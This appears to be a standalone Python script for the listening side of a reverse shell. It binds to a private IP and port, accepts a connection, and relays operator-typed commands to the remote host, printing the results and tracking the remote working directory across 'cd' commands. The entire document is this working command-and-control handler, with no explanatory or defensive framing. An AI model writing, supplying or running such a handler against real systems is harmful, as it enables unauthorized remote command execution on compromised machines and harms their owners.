import socket

def create_socket(ip, port):
    sock = socket.socket()
    sock.bind((ip,port))
    sock.listen(5)
    return sock

def connect(sock):
    s, address = sock.accept()
    return s, address

def send(s, text):
    s.send(bytes(text + "\n", "utf-8"))

def recv(s, buffer):
    return s.recv(buffer).decode("utf-8")

sock = create_socket("10.9.11.18",4422)
client, address = connect(sock)

print(recv(client, 16))
send(client,"hey sup")
while True:
    cmd = input("cmd -> ")
    send(client,cmd)
    output = (recv(client,1024))
    if output.startswith("currentpath:") and cmd.startswith("cd "):
        currentpath = output.replace("currentpath:", "")
        currentpath = currentpath.split("/")
    
        newpath = ""
        if cmd.replace("cd ", "") == "..":
            currentpath = currentpath[:-1]
         
            for a in currentpath:
                if a != "":
                    newpath = newpath + "/" + a
            send(client,"newpath:" + newpath)
        else:
            currentpath[-1] = currentpath[-1][:-1]
            for a in currentpath:
                if a != "":
                    newpath = newpath + "/" + a
            newpath = newpath +"/"+cmd.replace("cd ","")
            
            send(client, "newpath:" + newpath)
        output = recv(client,1024)
    print(output)